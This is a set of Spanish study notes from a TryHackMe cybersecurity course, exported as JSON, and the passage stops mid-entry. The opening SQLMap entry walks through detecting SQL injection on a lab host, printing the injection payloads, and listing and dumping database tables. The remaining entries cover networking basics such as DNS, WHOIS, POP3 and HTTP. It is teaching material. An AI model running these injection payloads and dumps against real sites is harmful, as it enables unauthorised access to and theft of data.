  {
    "title": "3. Automated SQL Injection Tool",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/3-automated-sql-injection-tool/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/3. Automated SQL Injection Tool.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "Ejecutar un ataque SQLI, requiere encontrar la vulnerabilidad SQLI dentro de una aplicaci√≥n web. Sin embargo, hacer eso de forma manual puede requerir tiempo y esfuerzo.\n\nSQLMap es una herramienta automatizada para detectar y explotar SQLI en aplicaciones web. Simplifica el proceso de identificar estas vulnerabilidades.\n\nEs una herramienta de CLI, por lo que si escribes `--help` podr√°s ver todas las flags que puedes usar. Si no quieres hacerlo manualmente en cada comando, puedes activar la flag `--wizard` que har√° que te gu√≠e por el proceso:\n\n```shell\nuser@ubuntu:~$ sqlmap --wizard\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.2.4#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n\n[*] starting at 08:42:50\n\n[08:42:50] [INFO] starting wizard interface\nPlease enter full target URL (-u): \n```\n\nLa flag `--dbs` te ayuda a extraer los nombres de las bases de datos. Una vez los tengas, puedes extraer informaci√≥n de las tablas de esa base de datos usando `-D database_name --tables`. Despu√©s de obtener las tablas, puedes usar `-D database_name -T table_name --dump`. Las diferentes flags nos ayudan a extraer informaci√≥n detallada de las bases de datos. Veamos un caso pr√°ctico:\n\nEl primer paso es buscar una URL vulnerable. Muchas veces te encontrar√°s con URLs que usan peticiones GET (como `http://sqlmaptesting.thm/search?cat=1`) para obtener la informaci√≥n, si ves una de estas puedes testear la URL con la flag `-u`.\n\nUsaremos una URL web supuesta vulnerable: `http://sqlmaptesting.thm` para la demostraci√≥n. Sup√≥n que esta p√°gina tiene una opci√≥n de b√∫squeda y cuando haces click en ella y buscas algo, la URL se convierte en `http://sqlmaptesting.thm/cat=1`, que usa el par√°metro GET `cat=1`. Como sabemos, estas URLs pueden ser vulnerables, por lo que probamos:\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1\n      __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:43:49] [INFO] testing connection to the target URL\n[08:43:49] [INFO] heuristics detected web page charset 'ascii'\n[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[08:43:49] [INFO] testing if the target URL content is stable\n[08:43:50] [INFO] target URL content is stable\n[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic\n[text removed]\n[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable \n[text removed]\n[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\nsqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: cat=1 AND SLEEP(5)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq\n---\n[08:45:16] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[text removed]\n```\n\nLos resultados muestran que diferentes tipos de SQLI se han identificado en la URL objetivo. Estas son t√©cnicas de SQLI. Mientras que en una \"boolean based\" usas booleanos, como `1=1`, en una \"error based\" modificas la query para generar errores y estos errores contienen informaci√≥n valiosa sobre los datos.\n\nUsemos flags para explotar la URL:\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs\n       __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:49:00] [INFO] resuming back-end DBMS' mysql' \n[08:49:00] [INFO] testing connection to the target URL\n[08:49:01] [INFO] heuristics detected web page charset 'ascii'\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n[text removed]    \n[08:49:01] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[08:49:01] [INFO] fetching database names\navailable databases [2]:\n[*] users\n[*] members\n\n[text removed]\n```\n\nDespu√©s de ejecutar  el comando vemos que hay dos bases de datos: `users` y `members`. Seleccionamos `users`, para ello definimos la base de datos despu√©s de la flag `-D` y usaremos `--tables` para obtener el nombre de las tablas:\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables\n       __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [\"]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:50:46] [INFO] resuming back-end DBMS' mysql' \n[08:50:46] [INFO] testing connection to the target URL\n[08:50:46] [INFO] heuristics detected web page charset 'ascii'\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n[text removed]\n[08:50:46] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[08:50:46] [INFO] fetching tables for database: 'users'\nDatabase: acuart\n[3 tables]\n+-----------+\n| johnath   |\n| alexas    |\n| thomas    |     \n+-----------+\n\n[text removed]\n```\n\nAhora que tenemos las tablas de la base de datos, extraeremos la informaci√≥n de `thomas`. Para ello, definiremos la base de datos con la flag `-D`, la tabla con `-T` y la flag `--dump` para extraer los datos.\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump\n       __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:51:48] [INFO] resuming back-end DBMS' mysql' \n[08:51:48] [INFO] testing connection to the target URL\n[08:51:49] [INFO] heuristics detected web page charset 'ascii'\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n[text removed]\n[08:51:49] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'\n[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'\n[08:51:49] [INFO] recognized possible password hashes in column 'passhash'\ndo you want to store hashes to a temporary file for eventual further processing n\ndo you want to crack them via a dictionary-based attack? [Y/n/q] n\nDatabase: users\nTable: thomas\n[1 entry]\n+---------------------+------------+---------+\n| Date                | name       | pass    |    \n+---------------------+------------+----------\n| 09/09/2024          | Thomas THM | testing |    \n+---------------------+------------+---------+\n\n[text removed]\n```\n\nTambi√©n se pueden usar URLs que usen el m√©todo POST, donde la informaci√≥n se manda en el cuerpo de la petici√≥n en lugar de la URL. Para hacer esto debes interceptar una petici√≥n y guardarla en un `.txt` para despu√©s usarla con SQLMap de la siguiente manera:\n\n```shell\nuser@ubuntu:~$ sqlmap -r intercepted_request.txt`\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Telnet",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/7-telnet/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/7. Telnet.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "TELNET (TELetype NETwork) es un protocolo de red para conexi√≥n remota a consolas. Es decir, `telnet` es una herramienta que nos permite comunicarnos con un sistema remoto y escribir comandos.\n\nEn la m√°quina a la que nos vamos a conectar hay varios servicios corriendo, nos centraremos en tres:\n\n- Servidor echo: Este servidor repite todo lo que le dices, por defecto opera en el puerto 7.\n- Servidor daytime: Este servidor escucha en el puerto 13 por defecto y responde con la hora y d√≠a actuales.\n- Servidor web (HTTP): Escucha en el puerto 80 por defecto y hostea p√°ginas web.\n\nAntes de continuar deber√≠amos mencionar que los servidores echo y daytime son considerados factores cr√≠ticos de seguridad y no deber√≠an ejecutarse. De cualquier forma los hemos conectado para ver su utilidad.\n\nCon telnet nos conectamos al puerto que nos interese, por ejemplo el echo (7) con `telnet <ip> <puerto>`. Para cerrar la conexi√≥n usamos `Ctrl + ]`.\n\n![[71.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "¬øAlguna vez te has preguntado por qu√© necesitas una direcci√≥n IP para entrar a Internet? ¬øEs verdad que una direcci√≥n IP identifica a un √∫nico usuario? ¬øSabes c√≥mo el la vida de un paquete? Comencemos.\n\nEsta es la primera de una serie de lecciones sobre el networking:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n----------------------\n<h2>Pre-requisitos</h2>\n[[2. Network Fundamentals]]\n\n<h2>Objetivos de aprendizaje</h2>\nPara cuando termines esta unidad habr√°s aprendido:\n\n- ISO OSI network model.\n- Direcciones IP, subredes y routing.\n- TCP, UDP, y n√∫meros de puertos.\n- C√≥mo conectarse a un puerto TCP abierto desde consola.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Encapsulation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/6-encapsulation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/6. Encapsulation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "Es crucial explicar otro concepto clave: la encapsulaci√≥n. En este contexto, la encapsulaci√≥n se refiere al proceso de a cada capa a√±adirle una cabecera (y a veces un pie).\n\nEn la imagen de abajo tenemos los siguientes pasos:\n\n- Informaci√≥n de aplicaci√≥n: Cuando el usuario introduce la informaci√≥n que quiere mandar.\n- Segmento del protocolo de transporte: La capa de transporte, como UDP o TCP, a√±ade informaci√≥n de cabecera y crea el TCP segment o UDP datagram.\n- Paquete de red: La capa de red a√±ade cabecera IP al segmento o datagram recibido, entonces, este paquete IP es mandado a la capa siguiente.\n- Marco de data link: El Ethernet o la WiFi recibe el paquete IP y le a√±ade su correspondiente cabecera y pie, creando el marco.\n\nEmpezamos con la aplicaci√≥n a enviar, en la capa de transporte a√±adimos TCP o UDP header. En la capa de red a√±adimos el IP header. Finalmente a√±adimos un header y un trailer para encapsular la informaci√≥n en un marco.\n\n![[5f04259cf9bf5b57aed2c476-1719849061418.jpg]]\n\n---------------------\n<h2>La vida de un paquete</h2>\nBasado en lo que hemos estudiado hasta el momento, podemos explicar de manera simplificada la vida de un paquete. Consideremos un escenario en el que buscamos una habitaci√≥n en TryHackMe.\n\n1. En la p√°gina de TryHackMe introducimos una query y le damos a buscar.\n2. El buscador web, usando HTTPS, prepara una petici√≥n HTTP y la manda a la capa debajo, la capa de transporte.\n3. La capa TCP necesita establecer una conexi√≥n v√≠a three-way handshake entre tu buscador y el servidor de TryHackMe. Despu√©s de que sea establecida, manda la petici√≥n que contiene la query.\n4. El la capa de red, la IP fuente es a√±adida y despu√©s mandado a la capa inferior, la capa de link.\n5. Dependiendo del protocolo, se a√±ade los correspondientes header y trailer y se manda al router.\n6. El router elimina el header de la capa de link inspecciona la IP de destino y lo manda al pr√≥ximo router. Cada router repite este proceso hasta que llega a su destino.\n\nLos pasos son invertidos despu√©s para volver a tu bnuscador.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. TCP-IP Model",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/3-tcp-ip-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/3. TCP-IP Model.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "Ahora que hemos visto el modelo conceptual ISO OSI, el momento de estudiar un modelo implementado. TCP/IP significa Tansmission Control Protocol/Internet Protocol y fue desarrollado en los a√±os 70 por el departamento de defensa (DoD). Una de las fortalezas de este modelo es que permite a la red continuar su funci√≥n incluso despu√©s de que algunas partes queden fuera de servicio. Es posible gracias a la adaptabilidad en funci√≥n de la topolog√≠a de la red. \n\nEn el modelo OSI, fuimos de abajo haca arriba, de 1 a 7. De cualquier forma aqu√≠ tomaremos un enfoque diferente e iremos de arriba a abajo:\n\n- Capa de aplicaci√≥n: Las capas 5, 6 y 7 del modelo OSI son apiladas en la misma capa en el modelo TCP/IP.\n- Capa de transporte: Esta es la capa 4 del modelo OSI.\n- Capa de Internet: Esta es la capa 3 del modelo OSI (capa de red).\n- Capa de link: Esta es la capa dos. Alguna gente la junta con la capa f√≠sica y otros no.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Networking Concepts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/0-networking-concepts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/0. Networking Concepts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/1. Introduction]]\n[[2. OSI Model]]\n[[3. TCP-IP Model]]\n[[4. IP Addresses and Subnets]]\n[[5. UDP and TCP]]\n[[6. Encapsulation]]\n[[7. Telnet]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. IP Addresses and Subnets",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/4-ip-addresses-and-subnets/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/4. IP Addresses and Subnets.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "Cuando escuchamos la palabra IP en seguida pensamos en algo como `192.168.0.1` o`172.16.159.243`. En cualquier de los casos es correcto, pero no completo.\n\nCada host en la red necesita un identificador √∫nico para que otros puedan comunicarse con √©l. Al usar el TCP/IP, necesitamos asignar una direcci√≥n IP para cada dispositivo conectado a la red.\n\nComo ya sabemos existen las direcciones IPv4 e IPv6. La IPv4 es la m√°s com√∫n hasta la fecha. ¬øDe qu√© se compone? Est√° compuesta de 4 octetos que van del 0 al 255. El 0 y el 255 est√°n reservados para la direcci√≥n de red y broadcast. Mandar algo a la direcci√≥n broadcast lo lleva a todos los dispositivos de la red. El problema principal de la IPv4 es que no se pueden tener algo m√°s de 4 billones de direcciones, que parece mucho pero realmente no lo es.\n\n-------------------\n<h2>Consultar tu configuraci√≥n de red</h2>\nPuedes consultar tu direcci√≥n IP en Windows MS usando el comando `ipconfig` o en Linux con el comando `ip a`. Esto nos devuelve:\n\n- Host IP.\n- M√°scara de subred.\n- Direcci√≥n de broadcast.\n\nUna subm√°scara de red `255.255.255.0` puede escribirse como `/24`. Esto significa que los primeros 24 bits, es decir, los tres primeros octetos, no cambian.\n\n------------------------\n<h2>Direcciones Privadas</h2>\nEs √∫til mencionar usos pr√°cticos. Hay dos tipos de IP: p√∫blicas y privadas. A una red privada no se puede acceder mediante una IP p√∫blica. El RFC 1918 define los siguientes rangos de IPs privadas.\n\n----------\n<h2>Routing</h2>\nUn router es un dispositivo que se encarga de redireccionar paquetes a otros routers correspondientes y as√≠ establecer una ruta entre dos IPs privadas. El router funciona en la capa 3 del modelo OSI.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. OSI Model",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/2-osi-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/2. OSI Model.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "[[0. OSI Model]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. UDP and TCP",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/5-udp-and-tcp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/5. UDP and TCP.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "El protocolo IP nos permite llegar a un host de destino en la red. Este host se identifica con la direcci√≥n IP. Hay dos protocolos de transporte de informaci√≥n, principalmente. \n\n----------------\n<h2>UDP</h2>\n[[3. UDP-IP]]\n\n---------------\n<h2>TCP</h2>\n[[2. TCP-IP (Three-Way Handshake)]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. WHOIS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/3-whois/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/3. WHOIS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "En la lecci√≥n anterior hemos visto c√≥mo el nombre de dominio se resuelve en una direcci√≥n IP. De todas formas, para que esto pase, alguien tiene que tener la autoridad de configurar los registros A, AAAA y MX.\n\nPuedes registrar cualquier nombre de dominio disponible  durante uno o m√°s a√±os. Necesitas pagar la tasa anual y se requiere que ofrezcas informaci√≥n de contacto detallada como el registrador. Esta informaci√≥n es parte de la informaci√≥n disponible mediante los registros WHOIS y disponible p√∫blicamente. Si quieres hacerlo de manera privada puedes recurrir a herramientas que ocultan tu informaci√≥n de los registros WHOIS.\n\nPuedes ver los detalles de cualquier dominio registrado haciendo `whois <dominio>`, en los sistemas Linux.\n\nAqu√≠ un ejemplo de un dominio protegido de manera privada:\n\n```bash\nuser@TryHackMe$ whois [REDACTED].com \n[...] \nDomain Name: [REDACTED].COM Registry \nDomain ID: [REDACTED] Registrar WHOIS \nServer: whois.godaddy.com Registrar \nURL: https://www.godaddy.com \nUpdated Date: 2017-07-05T16:02:43Z \nCreation Date: 1993-04-02T00:00:00Z \nRegistrar Registration Expiration Date: 2026-10-20T14:56:17Z \nRegistrar: GoDaddy.com, LLC Registrar IANA \nID: 146 Registrar \nAbuse Contact Email: abuse@godaddy.com \nRegistrar Abuse Contact Phone: +1.4806242505 \n[...] \nRegistrant Name: Registration Private \nRegistrant Organization: Domains By Proxy, LLC \nRegistrant Street: DomainsByProxy.com \n[...]\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Esta habitaci√≥n es la tercera de una serie de cuatro:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n---------------\n<h2>Pre-requisitos</h2>\n[[0. Networking Concepts]]\n\n---------------\n<h2>Objetivos de aprendizaje</h2>\nEn esta lecci√≥n aprenderemos sobre los siguientes protocolos:\n\n- WHOIS\n- DNS\n- HTTP y FTP\n- SMTP, POP3 e IMAP",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Networking Core Protocols",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/0-networking-core-protocols/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/0. Networking Core Protocols.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/1. Introduction]]\n[[2. DNS- Remembering Addresses]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/3. WHOIS]]\n[[4. HTTP(S) - Accessing the Web]]\n[[5. FTP - Transferring Files]]\n[[6. SMTP - Sending Email]]\n[[7. POP3 - Receiving Email]]\n[[8. IMAP - Synchronizing Email]]\n[[9. Conclusion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. DNS- Remembering Addresses",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/2-dns-remembering-addresses/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/2. DNS- Remembering Addresses.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "¬øRecuerdas la IP de tus sitios web favoritos? A no ser que sea una IP privada de un dispositivo local, nadie necesita preocuparse de memorizarlas gracias al DNS (Domain Name System).\n\nEl DNS trabaja en la capa de aplicaci√≥n (7) del modelo ISO OSI. El DNS usa tr√°fico de UDP en el puerto 53 por defecto y TCP en el puerto 53 como respaldo. Hay muchos tipos de registros DNS pero nos centraremos en los siguientes cuatro:\n\n- Registro A: Este mapea un hostname a una o m√°s direcciones IPv4, por ejemplo, puedes configurar `example.com` para que resuelva a `172.17.2.172`.\n- Registro AAAA: Similar al anterior pero para IPv6.\n- Registro CNAME: Este (Canonical Name), mapea un nombre de dominio a otro nombre de dominio, por ejemplo `www.example.com` a `example.com`.\n- Registro MX: Este (Mail Exchange) especifica el servidor de correo responsable de manejar emails para un dominio.\n\nEn otras palabras, cuando escribes `example.com` en tu servidor, este intenta resolver el nombre del dominio haciendo una query al registro A. Pero cuando intentas mandar un email a `test@example.com`, el servidor de mail hace una query al servidor DNS para encontrar el registro MX.\n\nSi quieres consultar la IP de un dominio puedes usar el comando `nslookup <dominio>`. Esto deja rastro de tr√°fico, en las peticiones uno y tres se busca en los registros A y AAAA y en los dos y cuatro se reciben las respuestas:\n\n```bash\nuser@TryHackMe$ nslookup www.example.com \nServer:         127.0.0.53 \nAddress:        127.0.0.53#53  \nNon-authoritative answer: \n\tName:   www.example.com \n\tAddress: 93.184.215.14 \n\tName:   www.example.com \n\tAddress: 2606:2800:21f:cb07:6820:80da:af6b:8b2c\n```\n\n```bash\nuser@TryHackMe$ tshark -r dns-query.pcapng -Nn     \n1 0.000000000 192.168.66.89 ‚Üí 192.168.66.1 DNS 86 Standard query 0x2e0f A www.example.com OPT     \n2 0.059049584 192.168.66.1 ‚Üí 192.168.66.89 DNS 102 Standard query response 0x2e0f A www.example.com A 93.184.215.14 OPT     \n3 0.059721705 192.168.66.89 ‚Üí 192.168.66.1 DNS 86 Standard query 0x96e1 AAAA www.example.com OPT     \n4 0.101568276 192.168.66.1 ‚Üí 192.168.66.89 DNS 114 Standard query response 0x96e1 AAAA www.example.com AAAA 2606:2800:21f:cb07:6820:80da:af6b:8b2c OPT\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. POP3 - Receiving Email",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/7-pop3-receiving-email/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/7. POP3 - Receiving Email.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Has recibido un email y quieres descargarlo en tu cliente de mail local. POP3 (Post Office Protocol version 3) est√° dise√±ado para permitir la comunicaci√≥n entre cliente y servidor.\n\nUn email se manda usando SMPT y se recupera usando POP3. Algunos comandos habituales son:\n\n- `USER <username>`: Identifica al usuario.\n- `PASS <password>`: Provee la contrase√±a del usuario.\n- `STAT`: Pide el n√∫mero de mensajes y el tama√±o total.\n- `LIST`: Lista todos los mensajes y sus tama√±os.\n- `RETR <message_number>`: Rescata el mensaje especificado.\n- `DELE <message_number>`: Marca un mensaje para su eliminaci√≥n.\n- `QUIT`: Termina la sesi√≥n POP3, aplicando cambios.\n\nDebajo podemos observar una sesi√≥n POP3 en `telnet`:\n\n```bash\nuser@TryHackMe$ telnet 10.10.65.120 110 \nTrying 10.10.65.120... \nConnected to 10.10.65.120. \nEscape character is '^]'. \n+OK [XCLIENT] Dovecot (Ubuntu) ready. \nAUTH \n+OK \nPLAIN . \nUSER strategos \n+OK \nPASS  \n+OK Logged in. \nSTAT \n+OK 3 1264 \nLIST \n+OK 3 messages: \n1 407 \n2 412 \n3 445 \n. \nRETR 3 \n+OK 445 octets \nReturn-path: <user@client.thm> \nEnvelope-to: strategos@server.thm \nDelivery-date: Thu, 27 Jun 2024 16:19:35 +0000 \nReceived: from [10.11.81.126] (helo=client.thm)         \n\tby example.thm with smtp (Exim 4.95)         \n\t(envelope-from <user@client.thm>)         \n\tid 1sMrpq-0001Ah-UT         \n\tfor strategos@server.thm;         \n\tThu, 27 Jun 2024 16:19:35 +0000 \nFrom: user@client.thm \nTo: strategos@server.thm \nSubject: Telnet email  \nHello. I am using telnet to send you an email! \n. \nQUIT \n+OK Logging out. \nConnection closed by foreign host.\n```\n\nDebajo en una imagen con la letra roja (cliente) y letra azul (servidor):\n\n![[085.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. HTTP(S) - Accessing the Web",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/4-http-s-accessing-the-web/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/4. HTTP(S) - Accessing the Web.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Cuando enciendes el buscador, normalmente usas HTTP y HTTPS. Este protocolo se basa en TCP y define c√≥mo tu buscador se relaciona con los servidores web.\n\nAlgunos de los comandos o m√©todos que tu buscador normalmente manda a los servidores web son:\n\n- `GET`: Recoge informaci√≥n del servidor como un archivo HTML o una imagen.\n- `POST`: Nos permite subir nueva informaci√≥n al server, como una form o un archivo.\n- `PUT`: Usado para crear un nuevo recurso en el servidor o para actualizar o sobrescribir informaci√≥n existente.\n- `DELETE`: Usado para borrar alg√∫n archivo o recurso de la red.\n\nHTTP y HTTPS usan, por defecto, los puertos 80 y 443, respectivamente.\n\nAl buscar en el buscador la IP `10.10.178.231`, el buscador nos muestra la p√°gina perfectamente, pero ¬øqu√© est√° pasando por detr√°s?\n\n![[080.png]]\n\nUsando Wireshark podemos examinar el intercambio entre el buscador y el servidor web. La siguiente imagen muestra el mensaje enviado por nuestro buscador al servidor en rojo y la respuesta del servidor web en azul.\n\n![[081.png]]\n\nComo recordar√°s, para conectarnos al servidor web usabamos telnet. Para recoger informaci√≥n de este, us√°bamos `GET / HTTP/1.1`. y `Host: anything`. Podemos recuperar ciertos archivos usando `GET /file.html HTTP/1.1`.\n\n![[082.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. FTP - Transferring Files",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/5-ftp-transferring-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/5. FTP - Transferring Files.md",
